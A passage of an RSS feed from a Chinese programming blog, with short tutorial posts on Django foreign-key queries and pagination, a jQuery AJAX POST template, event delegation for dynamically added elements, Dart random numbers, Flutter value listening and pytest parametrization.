Book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;publish__pname&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# values__list得到的结果是一个内部是元祖的查询集&lt;/span&gt;
Book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values_list(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;publish__pname&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 通过出版社的相关信息进行查询某一本书&lt;/span&gt;
Publish&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;book__bname&amp;#39;&lt;/span&gt;)
Publish&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values_list(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;book__bname&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_43102443/article/details/108270653&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Django 外键查询 @尛刀石 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Web开发—异步POST</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%BC%82%E6%AD%A5post/</link>
        <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E5%BC%82%E6%AD%A5post/</guid>
        <description>&lt;h2 id=&#34;1ajax&#34;&gt;1.&lt;code&gt;$ajax&lt;/code&gt;&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ajax&lt;/span&gt;({
     &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://&amp;#39;&lt;/span&gt;,
     &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;post&amp;#39;&lt;/span&gt;,
     &lt;span style=&#34;color:#a6e22e&#34;&gt;dataType&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;json&amp;#39;&lt;/span&gt;,
     &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;},
     &lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
     &lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { 
         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Authorization&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Bearer token&amp;#34;&lt;/span&gt;,
         &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;,
     },                
     &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;){
         
     },
     &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;){
         
     },
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—使用 Js 添加的元素无法点击</title>
        <link>https://ac-lm.github.io/posts/bug/bug%E4%BD%BF%E7%94%A8-js-%E6%B7%BB%E5%8A%A0%E7%9A%84%E5%85%83%E7%B4%A0%E6%97%A0%E6%B3%95%E7%82%B9%E5%87%BB/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bug%E4%BD%BF%E7%94%A8-js-%E6%B7%BB%E5%8A%A0%E7%9A%84%E5%85%83%E7%B4%A0%E6%97%A0%E6%B3%95%E7%82%B9%E5%87%BB/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;在使用&lt;code&gt;append()&lt;/code&gt;添加元素后，该元素的点击事件无法被监听生效&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;这些因为，这些动态加载的元素是在&lt;code&gt;css, js&lt;/code&gt;代码加载完后才添加的。因此当浏览器在解析&lt;code&gt;js&lt;/code&gt;代码时，这些动态添加的元素并未生成，从而也无法绑定相应的事件，事件也就不会触发。&lt;/p&gt;
&lt;p&gt;通过对&lt;code&gt;body&lt;/code&gt;绑定事件解决该问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;body&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;click&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.addBtn&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
    &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;new&amp;#39;&lt;/span&gt;)
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://juejin.cn/post/6844903703896391687&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; js添加HTML元素时出现的无效的点击事件 @wttwuhn &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Dart—随机数</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E9%9A%8F%E6%9C%BA%E6%95%B0/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E9%9A%8F%E6%9C%BA%E6%95%B0/</guid>
        <description>&lt;h2 id=&#34;1随机数&#34;&gt;1.随机数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:math&amp;#39;&lt;/span&gt;;
main(){
&lt;span style=&#34;color:#75715e&#34;&gt;// 实例化 Random 类并赋值给变量 rng；
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; rng &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Random();
&lt;span style=&#34;color:#75715e&#34;&gt;// 打印变量 rng，随机数范围(0-99);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(rng.nextInt(&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2random&#34;&gt;2.Random&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 返回的 0~(max-1) 的随机数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; nextInt(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; max);
&lt;span style=&#34;color:#75715e&#34;&gt;// 生成 1.0~0.0 的随机数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; nextDouble();
&lt;span style=&#34;color:#75715e&#34;&gt;// 生成随机布尔值: true/false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; nextBool();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—分页的实现</title>
        <link>https://ac-lm.github.io/posts/django/django%E5%88%86%E9%A1%B5%E7%9A%84%E5%AE%9E%E7%8E%B0/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E5%88%86%E9%A1%B5%E7%9A%84%E5%AE%9E%E7%8E%B0/</guid>
        <description>&lt;h2 id=&#34;1paginator&#34;&gt;1.Paginator&lt;/h2&gt;
&lt;h3 id=&#34;viewpy&#34;&gt;view.py&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.core.paginator &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Paginator, EmptyPage, PageNotAnInteger
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.shortcuts &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; render
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;listing&lt;/span&gt;(request):
    contact_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Contacts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all()
    paginator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Paginator(contact_list, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# Show 25 contacts per page&lt;/span&gt;
 
    page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        contacts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; paginator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;page(page)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; PageNotAnInteger:
        &lt;span style=&#34;color:#75715e&#34;&gt;# If page is not an integer, deliver first page.&lt;/span&gt;
        contacts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; paginator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;page(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; EmptyPage:
        &lt;span style=&#34;color:#75715e&#34;&gt;# If page is out of range (e.g. 9999), deliver last page of results.&lt;/span&gt;
        contacts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; paginator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;page(paginator&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;num_pages)
 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render(request, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;list.html&amp;#39;&lt;/span&gt;, {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;contacts&amp;#39;&lt;/span&gt;: contacts})

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;examplehtml&#34;&gt;Example.html&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;{% for contact in contacts %}
    {# Each &amp;#34;contact&amp;#34; is a Contact model object. #}
    {{ contact.full_name|upper }}&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
    ...
{% endfor %}
 
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pagination&amp;#34;&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;span&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;step-links&amp;#34;&lt;/span&gt;&amp;gt;
        {% if contacts.has_previous %}
            &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?page={{ contacts.previous_page_number }}&amp;#34;&lt;/span&gt;&amp;gt;previous&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
        {% endif %}
 
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;span&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current&amp;#34;&lt;/span&gt;&amp;gt;
            Page {{ contacts.number }} of {{ contacts.paginator.num_pages }}.
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;span&lt;/span&gt;&amp;gt;
 
        {% if contacts.has_next %}
            &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?page={{ contacts.next_page_number }}&amp;#34;&lt;/span&gt;&amp;gt;next&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
        {% endif %}
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;span&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—状态(数据)监听</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E7%8A%B6%E6%80%81%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E7%8A%B6%E6%80%81%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC/</guid>
        <description>&lt;h2 id=&#34;1valuelistenablebuilder&#34;&gt;1.ValueListenableBuilder&lt;/h2&gt;
&lt;p&gt;该&lt;code&gt;Widget&lt;/code&gt;配合&lt;code&gt;ValueNotifier&lt;/code&gt;可以实现对数据的监听&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/// 定义 ValueNotifier 这里传递的数据类型为 String
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;ValueNotifier&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; _testValueNotifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ValueNotifier&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#75715e&#34;&gt;/// 定义数据变化后监听的 Widget
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Widget buildValueListenableBuilder() {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ValueListenableBuilder(
    &lt;span style=&#34;color:#75715e&#34;&gt;/// 数据发生变化时回调,变化的布局
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    builder: (context, value, child) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(value &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;){
          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Text(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;空&amp;#39;&lt;/span&gt;);
        }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Text(value);
        }
    },
    &lt;span style=&#34;color:#75715e&#34;&gt;/// 监听的数据
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    valueListenable: _testValueNotifier,
  );
}
&lt;span style=&#34;color:#75715e&#34;&gt;/// 数据变化
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; testFunction() {
   &lt;span style=&#34;color:#75715e&#34;&gt;/// 赋值更新
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   _testValueNotifier.value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;传递的测试数据&amp;#39;&lt;/span&gt;;
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Pytest—数据参数化</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest%E6%95%B0%E6%8D%AE%E5%8F%82%E6%95%B0%E5%8C%96/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest%E6%95%B0%E6%8D%AE%E5%8F%82%E6%95%B0%E5%8C%96/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/poloyy/p/12675457.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 参数化@pytest.mark.parametrize @小菠萝测试笔记  &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1使用fixtrueparams参数实现参数化&#34;&gt;1.使用&lt;code&gt;fixtrue.params&lt;/code&gt;参数实现参数化&lt;/h2&gt;
&lt;h3 id=&#34;a通过-requestparam-返回参数值&#34;&gt;a.通过 request.param 返回参数值&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anjing&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;]

&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture(params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;login&lt;/span&gt;(request):
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登录功能&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;param
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;退出登录&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b使用&#34;&gt;b.使用&lt;/h3&gt;
&lt;p&gt;参数化的值可以做为返回值使用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_01&lt;/span&gt;(self, login):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例01---&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;用户名：&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; login)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c自定义控制台提示信息&#34;&gt;c.自定义控制台提示信息&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture(params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data, ids&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;This is anjing&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;This is admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;This is test&amp;#39;&lt;/span&gt;])
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;login&lt;/span&gt;(request):
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;登录功能&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;param
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;退出登录&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2pytestmarkparametrize实现参数化&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:2.%60@pytest.mark.parametrize&#34; &gt;2.`@pytest.mark.parametrize&lt;/a&gt;`实现参数化&lt;/h2&gt;
&lt;h3 id=&#34;a使用&#34;&gt;a.使用&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;def parametrize(self,argnames,argvalues,indirect=False,ids=None,scope=None)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;argnames&lt;/code&gt;：参数名称，字符串，多个使用逗号隔开&lt;/p&gt;
&lt;p&gt;&lt;code&gt;argvalues&lt;/code&gt;：值，必须是列表&lt;/p&gt;
&lt;p&gt;&lt;code&gt;indirect&lt;/code&gt;：是否作为函数执行&lt;/p&gt;
